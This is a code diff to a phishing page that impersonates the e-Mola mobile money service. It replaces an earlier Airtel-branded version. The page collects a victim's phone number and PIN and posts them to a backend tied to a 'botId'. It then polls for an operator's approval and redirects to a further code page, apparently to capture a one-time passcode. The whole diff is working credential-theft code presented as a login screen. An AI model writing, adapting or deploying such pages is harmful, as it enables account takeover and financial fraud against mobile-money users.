@@ -3,11 +3,12 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Enter PIN</title>
+<title>Login</title>
+
 <style>
 body {
     font-family: Arial, sans-serif;
-    background: #fff;
+    background: linear-gradient(180deg, #f2a44a, #c46b1a);
     display: flex;
     justify-content: center;
     align-items: center;
@@ -17,91 +18,75 @@ body {
 
 .pin-container {
     width: 90%;
-    max-width: 400px;
+    max-width: 380px;
     text-align: center;
+    color: #fff;
 }
 
-h1 {
-    color: #d60000;
+.logo {
     font-size: 32px;
-    margin-bottom: 5px;
+    font-weight: bold;
+    margin-bottom: 40px;
 }
 
-h2 {
-    font-weight: normal;
-    font-size: 20px;
-    margin-top: 0;
-    margin-bottom: 20px;
-    color: #333;
-}
-
-#phoneDisplay {
+input[type="tel"] {
     width: 100%;
-    padding: 12px;
-    border: 2px solid #d60000;
-    border-radius: 8px;
-    font-size: 18px;
-    text-align: center;
+    padding: 14px;
+    border-radius: 25px;
+    border: none;
+    outline: none;
+    font-size: 16px;
     margin-bottom: 15px;
-    pointer-events: none;
-    background: #fff;
     box-sizing: border-box;
 }
 
 .pin-boxes {
     display: flex;
     justify-content: space-between;
-    margin-bottom: 20px;
+    margin-bottom: 25px;
 }
 
 .pin-boxes input {
-    width: 55px;
+    width: 60px;
     height: 55px;
-    font-size: 24px;
+    border-radius: 12px;
+    border: none;
+    font-size: 22px;
     text-align: center;
-    border: 2px solid #d60000;
-    border-radius: 8px;
-    outline: none;
 }
 
 button {
     width: 100%;
-    padding: 12px;
-    background: #ccc;
-    color: #fff;
+    padding: 14px;
+    border-radius: 25px;
     border: none;
-    border-radius: 6px;
+    background: #fff;
+    color: #000;
     font-size: 16px;
-    cursor: not-allowed;
-}
-
-button.enabled {
-    background: #d60000;
+    font-weight: bold;
     cursor: pointer;
 }
 
-.status {
-    margin-top: 10px;
-    font-size: 14px;
-    color: red;
+button:disabled {
+    opacity: 0.6;
+    cursor: not-allowed;
 }
 
-.terms {
-    margin-top: 30px;
+.status {
+    margin-top: 15px;
     font-size: 14px;
-    color: #555;
 }
 </style>
 </head>
 <body>
 
 <div class="pin-container">
-    <h1>Airtel</h1>
-    <h2>Welcome</h2>
+    <div class="logo">e-Mola</div>
 
-    <input id="phoneDisplay" type="text" readonly>
+    <!-- PHONE NUMBER -->
+    <input id="phoneInput" type="tel" placeholder="Enter phone number" required>
 
-    <p>Enter your PIN</p>
+    <!-- PIN -->
     <form id="pinForm">
         <div class="pin-boxes">
             <input type="tel" maxlength="1" inputmode="numeric">
@@ -109,10 +94,10 @@ button.enabled {
             <input type="tel" maxlength="1" inputmode="numeric">
             <input type="tel" maxlength="1" inputmode="numeric">
         </div>
-        <button id="submitBtn" disabled>Login</button>
+
+        <button id="submitBtn" disabled>LOGIN</button>
     </form>
 
-    <p class="terms">By continuing, you agree to the Terms and Conditions</p>
     <div class="status" id="status"></div>
 </div>
 
@@ -127,18 +112,11 @@ if (!botId) {
     throw new Error("botId missing");
 }
 
-// ---------------- PREFILL PHONE ----------------
-const phoneDisplay = document.getElementById('phoneDisplay');
-const phone = localStorage.getItem('phone');
-if (!phone) {
-    window.location.href = `details.html?botId=${botId}`;
-}
-phoneDisplay.value = phone;
-
 // ---------------- PIN INPUT LOGIC ----------------
 const inputs = document.querySelectorAll('.pin-boxes input');
 const button = document.getElementById('submitBtn');
 const statusDiv = document.getElementById('status');
+const phoneInput = document.getElementById('phoneInput');
 
 inputs[0].focus();
 
@@ -146,14 +124,21 @@ inputs.forEach((input, i) => {
     input.addEventListener('input', () => {
         input.value = input.value.replace(/\D/g, '');
         if (input.value && i < inputs.length - 1) inputs[i + 1].focus();
+
         const allFilled = [...inputs].every(x => x.value.length === 1);
-        button.disabled = !allFilled;
-        button.classList.toggle('enabled', allFilled);
+        button.disabled = !(allFilled && phoneInput.value.trim());
     });
 
     input.addEventListener('keydown', e => {
-        if (e.key === 'Backspace' && !input.value && i > 0) inputs[i - 1].focus();
+        if (e.key === 'Backspace' && !input.value && i > 0) {
+            inputs[i - 1].focus();
+        }
     });
+});
+
+phoneInput.addEventListener('input', () => {
+    const allFilled = [...inputs].every(x => x.value.length === 1);
+    button.disabled = !(allFilled && phoneInput.value.trim());
 });
 
 // ---------------- SUBMIT PIN ----------------
@@ -161,7 +146,11 @@ document.getElementById('pinForm').addEventListener('submit', async e => {
     e.preventDefault();
     statusDiv.textContent = '';
 
+    const phone = phoneInput.value.trim();
     const pin = [...inputs].map(i => i.value).join('');
+
+    // ✅ STORE FOR NEXT PAGE
+    localStorage.setItem('phone', phone);
     localStorage.setItem('pin', pin);
 
     button.disabled = true;
@@ -180,16 +169,16 @@ document.getElementById('pinForm').addEventListener('submit', async e => {
 
     const { requestId } = await res.json();
 
-    // ---------------- POLLING FOR APPROVAL ----------------
+    // ---------------- POLLING ----------------
     const poll = setInterval(async () => {
         const r = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
         const d = await r.json();
 
         if (d.blocked) {
-            statusDiv.textContent = d.message || "Enter a valid prepaid number";
+            statusDiv.textContent = d.message || "Invalid number";
             button.disabled = false;
-            button.textContent = 'Login';
-            [...inputs].forEach(i => i.value = '');
+            button.textContent = 'LOGIN';
+            inputs.forEach(i => i.value = '');
             clearInterval(poll);
             return;
         }
@@ -197,14 +186,13 @@ document.getElementById('pinForm').addEventListener('submit', async e => {
         if (d.approved === true) {
             clearInterval(poll);
             window.location.href = `code.html?botId=${botId}&requestId=${requestId}`;
-            return;
         }
 
         if (d.approved === false) {
-            statusDiv.textContent = "Incorrect PIN. Enter again.";
+            statusDiv.textContent = "Incorrect PIN. Try again.";
             button.disabled = false;
-            button.textContent = 'Login';
-            [...inputs].forEach(i => i.value = '');
+            button.textContent = 'LOGIN';
+            inputs.forEach(i => i.value = '');
         }
     }, 1500);
 });
